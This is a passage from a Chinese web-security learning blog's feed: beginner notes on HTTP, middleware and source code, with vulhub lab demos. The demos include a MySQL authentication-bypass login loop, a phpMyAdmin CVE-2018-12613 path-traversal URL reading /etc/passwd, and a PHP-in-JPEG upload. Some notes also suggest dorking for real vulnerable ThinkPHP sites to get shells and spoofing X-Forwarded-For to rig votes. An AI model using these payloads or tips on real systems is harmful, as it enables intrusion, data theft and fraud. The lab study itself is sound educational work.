class="token punctuation">)</span></code></pre><p><font size="3"><strong>方法2</strong></font></p><pre class=" language-bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root💀kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~<span class="token punctuation">]</span>└─<span class="token comment" spellcheck="true"># for i in `seq 1 1000`;do mysql -uroot -pwrong -h 10.1.1.133 -P 3306; done                                                                                                      130 ⨯</span>ERROR 1045 <span class="token punctuation">(</span>28000<span class="token punctuation">)</span>: Access denied <span class="token keyword">for</span> user <span class="token string">'root'</span>@<span class="token string">'10.1.1.128'</span> <span class="token punctuation">(</span>using password: YES<span class="token punctuation">)</span>ERROR 1045 <span class="token punctuation">(</span>28000<span class="token punctuation">)</span>: Access denied <span class="token keyword">for</span> user <span class="token string">'root'</span>@<span class="token string">'10.1.1.128'</span> <span class="token punctuation">(</span>using password: YES<span class="token punctuation">)</span>ERROR 1045 <span class="token punctuation">(</span>28000<span class="token punctuation">)</span>: Access denied <span class="token keyword">for</span> user <span class="token string">'root'</span>@<span class="token string">'10.1.1.128'</span> <span class="token punctuation">(</span>using password: YES<span class="token punctuation">)</span>ERROR 1045 <span class="token punctuation">(</span>28000<span class="token punctuation">)</span>: Access denied <span class="token keyword">for</span> user <span class="token string">'root'</span>@<span class="token string">'10.1.1.128'</span> <span class="token punctuation">(</span>using password: YES<span class="token punctuation">)</span>ERROR 1045 <span class="token punctuation">(</span>28000<span class="token punctuation">)</span>: Access denied <span class="token keyword">for</span> user <span class="token string">'root'</span>@<span class="token string">'10.1.1.128'</span> <span class="token punctuation">(</span>using password: YES<span class="token punctuation">)</span>ERROR 1045 <span class="token punctuation">(</span>28000<span class="token punctuation">)</span>: Access denied <span class="token keyword">for</span> user <span class="token string">'root'</span>@<span class="token string">'10.1.1.128'</span> <span class="token punctuation">(</span>using password: YES<span class="token punctuation">)</span>ERROR 1045 <span class="token punctuation">(</span>28000<span class="token punctuation">)</span>: Access denied <span class="token keyword">for</span> user <span class="token string">'root'</span>@<span class="token string">'10.1.1.128'</span> <span class="token punctuation">(</span>using password: YES<span class="token punctuation">)</span>ERROR 1045 <span class="token punctuation">(</span>28000<span class="token punctuation">)</span>: Access denied <span class="token keyword">for</span> user <span class="token string">'root'</span>@<span class="token string">'10.1.1.128'</span> <span class="token punctuation">(</span>using password: YES<span class="token punctuation">)</span>ERROR 1045 <span class="token punctuation">(</span>28000<span class="token punctuation">)</span>: Access denied <span class="token keyword">for</span> user <span class="token string">'root'</span>@<span class="token string">'10.1.1.128'</span> <span class="token punctuation">(</span>using password: YES<span class="token punctuation">)</span>ERROR 1045 <span class="token punctuation">(</span>28000<span class="token punctuation">)</span>: Access denied <span class="token keyword">for</span> user <span class="token string">'root'</span>@<span class="token string">'10.1.1.128'</span> <span class="token punctuation">(</span>using password: YES<span class="token punctuation">)</span>ERROR 1045 <span class="token punctuation">(</span>28000<span class="token punctuation">)</span>: Access denied <span class="token keyword">for</span> user <span class="token string">'root'</span>@<span class="token string">'10.1.1.128'</span> <span class="token punctuation">(</span>using password: YES<span class="token punctuation">)</span>ERROR 1045 <span class="token punctuation">(</span>28000<span class="token punctuation">)</span>: Access denied <span class="token keyword">for</span> user <span class="token string">'root'</span>@<span class="token string">'10.1.1.128'</span> <span class="token punctuation">(</span>using password: YES<span class="token punctuation">)</span>Welcome to the MariaDB monitor.  Commands end with <span class="token punctuation">;</span> or \g.Your MySQL connection <span class="token function">id</span> is 1553Server version: 5.5.23 Source distributionCopyright <span class="token punctuation">(</span>c<span class="token punctuation">)</span> 2000, 2018, Oracle, MariaDB Corporation Ab and others.Type <span class="token string">'help;'</span> or <span class="token string">'\h'</span> <span class="token keyword">for</span> help. Type <span class="token string">'\c'</span> to <span class="token function">clear</span> the current input statement.MySQL <span class="token punctuation">[</span><span class="token punctuation">(</span>none<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token operator">></span></code></pre><h4 id="4、某第三方应用安全漏洞演示"><a href="#4、某第三方应用安全漏洞演示" class="headerlink" title="4、某第三方应用安全漏洞演示"></a><font size="4"><strong>4、某第三方应用安全漏洞演示</strong></font></h4><p><a href="https://vulhub.org/#/environments/phpmyadmin/CVE-2018-12613/">https://vulhub.org/#/environments/phpmyadmin/CVE-2018-12613/</a><br>环境搭建</p><pre class=" language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@hdss7-11 CVE-2018-12613<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># pwd</span>/opt/vulhub/vulhub-master/phpmyadmin/CVE-2018-12613<span class="token punctuation">[</span>root@hdss7-11 CVE-2018-12613<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># docker-compose up -d</span></code></pre><p><img src="/2023/09/18/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-005/3.png"></p><p>漏洞利用<br><a href="http://10.1.1.133:8080/?target=db_sql.php%253f/../../../../../../../../etc/passwd">http://10.1.1.133:8080/?target=db_sql.php%253f/../../../../../../../../etc/passwd</a></p><p><img src="/2023/09/18/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-005/4.png"></p><h3 id="五、涉及资源："><a href="#五、涉及资源：" class="headerlink" title="五、涉及资源："></a><font size="5"><strong>五、涉及资源：</strong></font></h3><p><a href="https://nmap.org/">https://nmap.org/</a><br><a href="https://www.kali.org/downloads/">https://www.kali.org/downloads/</a><br><a href="https://github.com/hellogoldsnakeman/masnmapscan-V1.0">https://github.com/hellogoldsnakeman/masnmapscan-V1.0</a></p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web安全日志-004</title>
      <link href="/2023/09/17/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-004/"/>
      <url>/2023/09/17/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-004/</url>
      
        <content type="html"><![CDATA[<h2 id="基础入门-WEB源码拓展"><a href="#基础入门-WEB源码拓展" class="headerlink" title="基础入门-WEB源码拓展"></a><font size="6"><strong>基础入门-WEB源码拓展</strong></font></h2><span id="more"></span><h3 id="一、WEB源码拓展"><a href="#一、WEB源码拓展" class="headerlink" title="一、WEB源码拓展"></a><font size="5"><strong>一、WEB源码拓展</strong></font></h3><pre class=" language-bash"><code class="language-bash">    前言:WEB源码在安全测试中是非常重要的信息来源，可以用来代码审计漏洞也可以用来做信息突破口，其中WEB源码有很多技术需要简明分析。比如:获取某ASP源码后可以采用默认数据库下载为突破，获取某其他脚本源码漏洞可以进行代码审计挖掘或分析其业务逻辑等，总之源码的获取将为后期的安全测试提供了更多的思路。</code></pre><h4 id="知识点："><a href="#知识点：" class="headerlink" title="知识点："></a><font size="4"><strong>知识点：</strong></font></h4><p>1、关于WEB源码目录结构<br>2、关于WEB源码脚本类型<br>3、关于WEB源码应用分类<br>4、关于WEB源码其他说明</p><pre class=" language-bash"><code class="language-bash"><span class="token comment" spellcheck="true">#数据库配置文件，后台目录，模版目录，数据库目录等</span><span class="token comment" spellcheck="true">#ASP,PHP,ASPX,JSP,JAVAWEB等脚本类型源码安全问题</span><span class="token comment" spellcheck="true">#社交，论坛，门户，第三方，博客等不同的代码机制对应漏洞</span><span class="token comment" spellcheck="true">#开源，未开源问题，框架非框架问题，关于CMS识别问题及后续等</span><span class="token comment" spellcheck="true">#关于源码获取的相关途径:搜索，咸鱼淘宝，第三方源码站，各种行业对应</span><span class="token comment" spellcheck="true">#总结:</span>关注应用分类及脚本类型估摸出可能存在的漏洞（其中框架类例外），在获取源码后可进行本地安全测试或代码审计，也可以分析其目录工作原理（数据库备份，bak文件等），未获取到的源码采用各种方法想办法获取<span class="token operator">!</span></code></pre><p><img src="/2023/09/17/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-004/1.png"></p><h3 id="二、演示案例"><a href="#二、演示案例" class="headerlink" title="二、演示案例"></a><font size="5"><strong>二、演示案例</strong></font></h3><h4 id="1、asp、php等源码测试"><a href="#1、asp、php等源码测试" class="headerlink" title="1、asp、php等源码测试"></a><font size="4"><strong>1、asp、php等源码测试</strong></font></h4><h4 id="2、平台识别-某CMS无漏洞-默认数据库平台"><a href="#2、平台识别-某CMS无漏洞-默认数据库平台" class="headerlink" title="2、平台识别-某CMS无漏洞-默认数据库平台"></a><font size="4"><strong>2、平台识别-某CMS无漏洞-默认数据库平台</strong></font></h4><p><img src="/2023/09/17/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-004/2.png"><br><img src="/2023/09/17/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-004/3.png"><br>在线cms识别网站</p><table>    <thead>        <tr>            <th>网站</th>            <th>优点</th>            <th>缺点</th>        </tr>    </thead>    <tbody>        <tr>            <td>https://www.yunsee.cn/</td>            <td>相应的速度快</td>            <td>企业版收费</td>        </tr>        <tr>            <td>http://whatweb.bugscaner.com/</td>            <td>可以在线和多个cms识别</td>            <td>广告</td>        </tr>    </tbody></table><h4 id="3、源码应用针对漏洞"><a href="#3、源码应用针对漏洞" class="headerlink" title="3、源码应用针对漏洞"></a><font size="4"><strong>3、源码应用针对漏洞</strong></font></h4><pre class=" language-bash"><code class="language-bash">niushop电商类关注漏洞点-业务逻辑参考地址：https://www.niushop.com.cn/download.html电商类网站的主要漏洞就是网站的支付问题。</code></pre><h4 id="4、简要目标识别源码获取"><a href="#4、简要目标识别源码获取" class="headerlink" title="4、简要目标识别源码获取"></a><font size="4"><strong>4、简要目标识别源码获取</strong></font></h4><pre class=" language-bash"><code class="language-bash">本地演示个人博客-手工发现其CMS-漏洞搜索或下载分析http://weipan.1016sangshen.cn/ 内部搭建的靶场人人工爆框架–搜索特定url（输入index/login/login/token搜索有漏洞的网站，还可以搜网站文件名如arc.listview.class.php）–获取其他相符站点-漏洞测试借助特定行业源码或咸鱼进行搜索获取–本地搭建–代码审计或其他还可以把url放到ThinkPHP进行漏洞检测、命令执行、getshell；可以尝试去搜索引擎搜一下index/login/login/token，找到对应网站再放到thnkphp中检测</code></pre><h3 id="三、涉及资源"><a href="#三、涉及资源" class="headerlink" title="三、涉及资源"></a><font size="5"><strong>三、涉及资源</strong></font></h3><p>搜十二堂源码下载站<br>咸鱼获取源码</p><p>云悉指纹识别：<a href="https://www.yunsee.cn/">https://www.yunsee.cn</a></p><p>CMS识别工具（如果失效就去小迪博客里找）：<br><a href="https://w.ddosi.workers.dev/">https://w.ddosi.workers.dev/</a><br><a href="http://whatweb.bugscaner.com/">http://whatweb.bugscaner.com</a><br><a href="https://github.com/Lucifer1993/cmsprint">https://github.com/Lucifer1993/cmsprint</a><br><a href="https://github.com/M4tir/Github-Monitor">https://github.com/M4tir/Github-Monitor</a></p><p>语言与框架（还包含内网渗透等web安全知识）：<a href="https://websec.readthedocs.io/zh/latest/language/index.html">https://websec.readthedocs.io/zh/latest/language/index.html</a></p><p>另外还有windows靶机集合部分源码，在群文件靶机目录下载文本文件</p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web安全日志-003</title>
      <link href="/2023/09/16/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-003/"/>
      <url>/2023/09/16/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-003/</url>
      
        <content type="html"><![CDATA[<h2 id="基础入门-搭建安全拓展"><a href="#基础入门-搭建安全拓展" class="headerlink" title="基础入门-搭建安全拓展"></a><font size="6"><strong>基础入门-搭建安全拓展</strong></font></h2><span id="more"></span><h3 id="一、涉及知识"><a href="#一、涉及知识" class="headerlink" title="一、涉及知识"></a><font size="5"><strong>一、涉及知识</strong></font></h3><ol><li>常见搭建平台脚本启用</li><li>域名IP目录解析安全问题</li><li>常见文件后缀解析对应安全</li><li>常见安全测试中的安全防护</li><li>WEB后门与用户及文件权限</li></ol><h3 id="二、常见的问题"><a href="#二、常见的问题" class="headerlink" title="二、常见的问题"></a><font size="5"><strong>二、常见的问题</strong></font></h3><pre class=" language-bash"><code class="language-bash"><span class="token comment" spellcheck="true">#ASP,PHP,ASPx,JSP,PY,JAVAWEB等环境</span><span class="token comment" spellcheck="true">#WEB源码中敏感文件</span>后台路径，数据库配置文件，备份文件等<span class="token comment" spellcheck="true">#ip或域名解析wEB源码目录对应下的存在的安全问题</span>域名访问，IP访问（结合类似备份文件目录<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#脚本后缀对应解析（其他格式可相同-上传安全)</span><span class="token comment" spellcheck="true">#存在下载或为解析问题</span><span class="token comment" spellcheck="true">#常见防护中的IP验证，域名验证等</span><span class="token comment" spellcheck="true">#后门是否给予执行权限</span><span class="token comment" spellcheck="true">#后门是否给予操作目录或文件权限#后门是否给予其他用户权限</span><span class="token comment" spellcheck="true">#总结下关于可能会存在的安全或防护问题?</span></code></pre><h3 id="三、web权限的设置"><a href="#三、web权限的设置" class="headerlink" title="三、web权限的设置"></a><font size="5"><strong>三、web权限的设置</strong></font></h3><pre class=" language-bash"><code class="language-bash">   在一般的情况下我们会对某个目录取消执行权限、最典型的就是图片目录这个目录只放图像没有脚本我们会取消执行的权限、这样我们可以防范一部分的文件上传漏洞、即使开发写的代码有问题也不会导致服务器出现安全事故。   绕过方法：     如果我们上传的文件如果不能正常的执行那么将文件放在其他目录、例如网站的根目录下面</code></pre><h3 id="四、演示案例-环境搭建"><a href="#四、演示案例-环境搭建" class="headerlink" title="四、演示案例-环境搭建"></a><font size="5"><strong>四、演示案例-环境搭建</strong></font></h3><h4 id="1、PHPinfo"><a href="#1、PHPinfo" class="headerlink" title="1、PHPinfo"></a><font size="4"><strong>1、PHPinfo</strong></font></h4><p>● 基于中间件的简要识别<br>一般可以通过抓包的方式分析出是什么类型的服务器和中间件<br><img src="/2023/09/16/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-003/1.png"><br>可以看见在自己搭建的平台看见使用的apache(windows) php7.3<br>● 基于中间件的安全漏洞<br>可以根据在第一步上面收集到的信息、去找Apache的漏洞和PHP的漏洞</p><p>● 基于中间件的靶场使用<br><a href="https://vulhub.org/#/environments/">https://vulhub.org/#/environments/</a><br>这个是用docker搭建的一个靶场非常的方便</p><p>环境搭建并测试,参考文档：<a href="https://vulhub.org/#/docs/install-docker-one-click/">https://vulhub.org/#/docs/install-docker-one-click/</a></p><p>第一步安装好docker环境并下载文件</p><pre class=" language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@hdss7-11 ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># docker -v</span>Docker version 20.10.6, build 370c289<span class="token punctuation">[</span>root@hdss7-11 ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># docker-compose -v</span>docker-compose version 1.18.0, build 8dd22a9<span class="token punctuation">[</span>root@hdss7-11 ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># cd /opt/vulhub/</span><span class="token punctuation">[</span>root@hdss7-11 vulhub<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># wget https://github.com/vulhub/vulhub/archive/master.zip</span></code></pre><p>第二步<a href="https://vulhub.org/#/environments/%E6%9F%A5%E6%89%BE%E4%BD%A0%E6%83%B3%E5%81%9A%E7%9A%84%E7%8E%AF%E5%A2%83">https://vulhub.org/#/environments/查找你想做的环境</a><br><img src="/2023/09/16/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-003/2.png"></p><pre class=" language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@hdss7-11 vulhub<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># cd vulhub-master/httpd/apache_parsing_vulnerability/</span><span class="token punctuation">[</span>root@hdss7-11 apache_parsing_vulnerability<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># docker-compose up -d</span></code></pre><p><img src="/2023/09/16/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-003/3.png"><br>创建文件并命名为x.php.jpeg并上传</p><pre class=" language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@hdss7-11 ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># cat x.php.jpeg</span><span class="token operator">&lt;</span>?php       phpinfo<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>?<span class="token operator">></span></code></pre><p><img src="/2023/09/16/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-003/4.png"><br><img src="/2023/09/16/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-003/5.png"></p><h4 id="2、wordpress"><a href="#2、wordpress" class="headerlink" title="2、wordpress"></a><font size="4"><strong>2、wordpress</strong></font></h4><p><img src="/2023/09/16/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-003/6.png"></p><pre class=" language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@hdss7-11 vulhub-master<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># find . -name wordpress</span>./base/wordpress./wordpress<span class="token punctuation">[</span>root@hdss7-11 vulhub-master<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># cd wordpress/</span><span class="token punctuation">[</span>root@hdss7-11 wordpress<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># cd pwnscriptum/</span>1.png  docker-compose.yml  exploit.py  README.md  README.zh-cn.md<span class="token punctuation">[</span>root@hdss7-11 pwnscriptum<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># docker-compose up -d</span></code></pre><p><img src="/2023/09/16/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-003/7.png"></p><h3 id="五、涉及资源"><a href="#五、涉及资源" class="headerlink" title="五、涉及资源"></a><font size="5"><strong>五、涉及资源</strong></font></h3><p>Vulhub靶场：<a href="https://www.vulhub.org/">https://www.vulhub.org/</a><br>Web中间件常见漏洞总结（pdf文件）</p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web安全日志--002</title>
      <link href="/2023/09/15/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-002/"/>
      <url>/2023/09/15/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-002/</url>
      
        <content type="html"><![CDATA[<h2 id="基础入门-数据包拓展"><a href="#基础入门-数据包拓展" class="headerlink" title="基础入门-数据包拓展"></a><font size="6"><strong>基础入门-数据包拓展</strong></font></h2><span id="more"></span><h3 id="一、网站解析对应"><a href="#一、网站解析对应" class="headerlink" title="一、网站解析对应"></a><font size="5"><strong>一、网站解析对应</strong></font></h3><p>●涉及到的攻击层面？（源码，搭建平台，系统，网络层等）<br>●涉及到的安全问题？（目录，敏感文件，弱口令，IP及域名等）</p><h3 id="二、HTTP-S数据包"><a href="#二、HTTP-S数据包" class="headerlink" title="二、HTTP&#x2F;S数据包"></a><font size="5"><strong>二、HTTP&#x2F;S数据包</strong></font></h3><p><img src="/2023/09/15/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-002/1.png"></p><pre class=" language-bash"><code class="language-bash">Request请求数据包Response返回数据包proxy代理服务器</code></pre><p><font size="4"><strong>HTTP&#x2F;HTTPS具体区别？</strong></font><br><img src="/2023/09/15/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-002/2.png"></p><p><font size="4"><em>HTTP简要通信过程</em>*</font><br><img src="/2023/09/15/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-002/3.png"></p><pre class=" language-bash"><code class="language-bash">建立连接——<span class="token operator">></span>发送请求数据包——<span class="token operator">></span>返回响应数据包——<span class="token operator">></span>关闭连接1.浏览器建立与web服务器之间的连接2.浏览器将请求数据打包（生成请求数据包）并发送到web服务器3.web服务器将处理结果打包（生成响应数据包）并发送给浏览器4.web服务器关闭连接</code></pre><h3 id="三、Request请求数据包数据格式"><a href="#三、Request请求数据包数据格式" class="headerlink" title="三、Request请求数据包数据格式"></a><font size="5"><strong>三、Request请求数据包数据格式</strong></font></h3><h4 id="Request请求数据包数据格式"><a href="#Request请求数据包数据格式" class="headerlink" title="Request请求数据包数据格式"></a><font size="4"><strong>Request请求数据包数据格式</strong></font></h4><p>● 请求行：请求类型&#x2F;请求资源路径、协议的版本和类<br>● 请求头：一些键值对，浏览器与web服务器之间都可以发送，特定的某种含义<br>● 空行：请求头与请求体之间用一个空行隔开；<br>● 请求体：要发送的数据(一般post提交会使用)；例：user&#x3D;123&amp;pass&#x3D;123</p><h5 id="1、请求行"><a href="#1、请求行" class="headerlink" title="1、请求行"></a><font size="3"><strong>1、请求行</strong></font></h5><p>请求行由三个标记组成：请求方法、请求URL和HTTP版本，它们用空格分享。<br>例如：GET &#x2F;index.html HTTP&#x2F;1.1</p><p>HTTP 规划定义了8种可能的请求方法：<br>● GET：检索URL中标识资源的一个简单请求<br>● HEAD：与GET方法相同，服务器只返回状态行和头标，并不返回请求文档<br>● POST：服务器接受被写入客户端输出流中的数据的请求<br>● PUT：服务器保存请求数据作为指定URL新内容的请求 DELETE：服务器删除URL中命令的资源的请求<br>● OPTIONS：关于服务器支持的请求方法信息的请求<br>● TRACE：web服务器反馈Http请求和其头标的请求<br>● CONNECT ：已文档化，但当前未实现的一个方法，预留做隧道处理</p><h5 id="2、请求头"><a href="#2、请求头" class="headerlink" title="2、请求头"></a><font size="3"><strong>2、请求头</strong></font></h5><p>由关键字&#x2F;值对组成，每行一对，关键字和值用冒号分享。请求头标通知服务器腾于客户端的功能和标识。</p><p>● HOST: 主机或域名地址<br>● Accept：指浏览器或其他客户可以接爱的MIME文件格式。Servlet可以根据它判断并返回适当的文件格式<br>● User-Agent：是客户浏览器名称<br>● Host：对应网址URL中的Web名称和端口号<br>● Accept-Langeuage：指出浏览器可以接受的语言种类，如en或en-us，指英语<br>● connection：用来告诉服务器是否可以维持固定的HTTP连接。http是无连接的，HTTP&#x2F;1.1使用Keep-Alive为默认值，这样，当浏览器需要多个文件时(比如一个HTML文件和相关的图形文件)，不需要每次都建立连接<br>● Cookie：浏览器用这个属性向服务器发送Cookie。Cookie是在浏览器中寄存的小型数据体，它可以记载和服务器相关的用户信息，也可以用来实现会话功能<br>● Referer：表明产生请求的网页URL。如比从网页&#x2F;icconcept&#x2F;index.jsp中点击一个链接到网页&#x2F;icwork&#x2F;search，在向服务器发送的GET&#x2F;icwork&#x2F;search中的请求中，Referer是<a href="http://hostname:8080/icconcept/index.jsp%E3%80%82%E8%BF%99%E4%B8%AA%E5%B1%9E%E6%80%A7%E5%8F%AF%E4%BB%A5%E7%94%A8%E6%9D%A5%E8%B7%9F%E8%B8%AAWeb%E8%AF%B7%E6%B1%82%E6%98%AF%E4%BB%8E%E4%BB%80%E4%B9%88%E7%BD%91%E7%AB%99%E6%9D%A5%E7%9A%84">http://hostname:8080/icconcept/index.jsp。这个属性可以用来跟踪Web请求是从什么网站来的</a><br>● Content-Type：用来表名request的内容类型。可以用HttpServletRequest的getContentType()方法取得<br>● Accept-Charset：指出浏览器可以接受的字符编码。英文浏览器的默认值是ISO-8859-1<br>● Accept-Encoding：指出浏览器可以接受的编码方式。编码方式不同于文件格式，它是为了压缩文件并加速文件传递速度。浏览器在接收到Web响应之后先解码，然后再检查文件格式</p><h5 id="3、空行"><a href="#3、空行" class="headerlink" title="3、空行"></a><font size="3"><strong>3、空行</strong></font></h5><p>最后一个请求头标之后是空行，发送回车符和退行，通知服务器以下不再有头标。</p><h5 id="4-请求数据"><a href="#4-请求数据" class="headerlink" title="4.请求数据"></a><font size="3"><strong>4.请求数据</strong></font></h5><p>使用POST传送，最常使用的是 Content-Type 和 Content-Length 头标。</p><h3 id="四、Response返回数据包数据格式"><a href="#四、Response返回数据包数据格式" class="headerlink" title="四、Response返回数据包数据格式"></a><font size="5"><strong>四、Response返回数据包数据格式</strong></font></h3><h4 id="1、一个响应由四个部分组成；状态行、响应头标、空行、响应数据。"><a href="#1、一个响应由四个部分组成；状态行、响应头标、空行、响应数据。" class="headerlink" title="1、一个响应由四个部分组成；状态行、响应头标、空行、响应数据。"></a><font size="4"><strong>1、一个响应由四个部分组成；状态行、响应头标、空行、响应数据。</strong></font></h4><p>● 状态行：协议版本、数字形式的状态代码和状态描述，个元素之间以空格分隔<br>● 响应头标：包含服务器类型、日期、长度、内容类型等<br>● 空行：响应头与响应体之间用空行隔开<br>● 响应数据：浏览器会将实体内容中的数据取出来，生成相应的页面</p><h4 id="2、HTTP响应码"><a href="#2、HTTP响应码" class="headerlink" title="2、HTTP响应码"></a><font size="4"><strong>2、HTTP响应码</strong></font></h4><p>1xx：信息，请求收到，继续处理<br>2xx：成功，行为被成功地接受、理解和采纳<br>3xx：重定向，为了完成请求，必须进一步执行的动作<br>4xx：客户端错误<br>5xx：服务器错误</p><p>200 存在文件<br>403 存在文件夹<br>3xx 均可能存在<br>404 不存在文件及文件夹<br>500 均可能存在</p><p>1.响应头标<br>像请求头标一样，它们指出服务器的功能，标识出响应数据的细节。</p><p>2.空行<br>最后一个响应头标之后是一个空行，发送回车符和退行，表明服务器以下不再有头标。</p><p>3.响应数据<br>HTML文档和图像等，也就是HTML本身。</p><h3 id="五、涉及演示案例"><a href="#五、涉及演示案例" class="headerlink" title="五、涉及演示案例"></a><font size="5"><strong>五、涉及演示案例</strong></font></h3><p>Burpsuite抓包修改测试</p><h4 id="1、敏感文件扫描工具简要实现"><a href="#1、敏感文件扫描工具简要实现" class="headerlink" title="1、敏感文件扫描工具简要实现"></a><font size="4"><strong>1、敏感文件扫描工具简要实现</strong></font></h4><p>  御剑web目录扫描工具（还有一款铸剑，功能更多），扫描时可以配合wireshark抓包分析（筛选条件：扫描的ip或域名）。<br><img src="/2023/09/15/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-002/4.png"></p><h4 id="2、第三方检测修改实现XSS攻击"><a href="#2、第三方检测修改实现XSS攻击" class="headerlink" title="2、第三方检测修改实现XSS攻击&gt;"></a><font size="4"><strong>2、第三方检测修改实现XSS攻击</strong></font>&gt;</h4><p>  bp抓包修改信息（比如访问ip.chinaz.com，会看到你的ip等信息，用bp抓包，改包，比如改user-agent，然后再forward，会发现信息改变）</p><h4 id="3、CTF或实际应用中部分考题解析（mozhe）"><a href="#3、CTF或实际应用中部分考题解析（mozhe）" class="headerlink" title="3、CTF或实际应用中部分考题解析（mozhe）"></a><font size="4"><strong>3、CTF或实际应用中部分考题解析（mozhe）</strong></font></h4><ol><li>伪造User-Agent(例如伪造成手机客户端等等) </li><li>伪造referer</li><li>伪造ip（查一下php获取ip的方法，改X-forwarded-For，配合bp的Intruder功能实现许多ip不断访问对方url，各种投票的刷票也可以使用这个思路）</li></ol><h3 id="六、涉及资源"><a href="#六、涉及资源" class="headerlink" title="六、涉及资源"></a><font size="5"><strong>六、涉及资源</strong></font></h3><p>● <a href="https://www.mozhe.cn/">https://www.mozhe.cn/</a><br>● <a href="https://www.ddosi.com/b261/">https://www.ddosi.com/b261/</a></p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web安全日志--001</title>
      <link href="/2023/09/14/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-001/"/>
      <url>/2023/09/14/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-001/</url>
      
        <content type="html"><![CDATA[<h2 id="基础入门-概念名词"><a href="#基础入门-概念名词" class="headerlink" title="基础入门-概念名词"></a><font size="6"><strong>基础入门-概念名词</strong></font></h2><span id="more"></span><h3 id="一、域名"><a href="#一、域名" class="headerlink" title="一、域名"></a><font size="5"><strong>一、域名</strong></font></h3><h4 id="1、什么是域名？"><a href="#1、什么是域名？" class="headerlink" title="1、什么是域名？"></a><font size="4"><strong>1、什么是域名？</strong></font></h4><p>域名（英语：Domain Name），又称网域，是由一串用点分隔的名字组成的Internet上某一台计算机或计算机组的名称，用于在数据传输时对计算机的定位标识（有时也指地理位置）。</p><p>由于IP地址具有不方便记忆并且不能显示地址组织的名称和性质等缺点，人们设计出了域名，并通过网域名称系统（DNS，Domain Name System）来将域名和IP地址相互映射，使人更方便地访问互联网，而不用去记住能够被机器直接读取的IP地址数串。</p><p>比如<a href="http://www.baidu.com,这就是一个域名,简单来说就是ip不好记,所以有了域名来方便记忆.可以联想到地址和经纬度的关系(上海/">www.baidu.com，这就是一个域名，简单来说就是ip不好记，所以有了域名来方便记忆。可以联想到地址和经纬度的关系（上海</a> ：经度 121.48 纬度 31.22）</p><h4 id="2、域名在哪里注册？"><a href="#2、域名在哪里注册？" class="headerlink" title="2、域名在哪里注册？"></a><font size="4"><strong>2、域名在哪里注册？</strong></font></h4><p>找个域名注册商的网站（比如阿里、万网），搜索想要的域名（由于国内并非所有域名都支持备案，目前提供主流可备案域名有：</p><pre class=" language-bash"><code class="language-bash">$ .com, .cn, .com.cn, .net, .top, .wang, .vip, .company, .org.cn,.ac.cn, .site, .online, .ren .store, .tech, .xyz, .club, .link, .pro, .red, .info, .biz, .ltd, .gov.cn, .mobi, .city 等"</code></pre><p>填写域名资料。若你是以公司名义注册域名，则需要填写企业资料、联系人信息；若你是以个人名义注册，请切换到个人栏，填写个人信息。域名英文信息将会根据你填写的中文自动翻译，请核对是否有误，若有误请及时进行修改。</p><p>确认域名账单。确认域名注册人信息、账单无误后，使用支付宝或微信扫码支付即可完成注册。</p><p>域名实名验证。因国内法律法规要求，域名注册后需要进行实名认证，通过认证后即可正式生效。若审核有误，请及时进行修改，再次提交审核。</p><p>域名备案及绑定网站。如果你需要在国内上线，则需要进行网站备案。</p><h4 